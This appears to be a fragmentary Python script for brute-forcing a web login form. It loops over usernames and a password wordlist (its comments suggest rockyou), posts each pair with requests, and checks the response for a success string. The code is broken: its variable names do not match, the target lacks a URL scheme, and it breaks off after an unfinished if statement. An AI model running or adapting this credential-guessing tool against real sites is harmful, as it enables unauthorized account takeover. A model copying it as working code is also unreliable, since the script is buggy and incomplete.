import requests, sys


target = "127.0.0.1"
usernames = ["test","admin","user"] #consider replacing with a kali username file
password = "passwords.txt" #consider replacing with a kali file, such as rockyou
needle = "Welcome Back!" #Successful string

for username in usernames:
    with open(passwords, "r") as passwords_list:
        for password in password_list:
            password = password.strip("\n").encode()
            sys.stdout.write("[X] Attempting username:password '{}:{}'\r".format(username, password.decode()))
            sys.stdout.flush() #flush buffer
            r = requests.post(target, data={"username":username, "password":password})
            if needle.encode() in r.content:
                

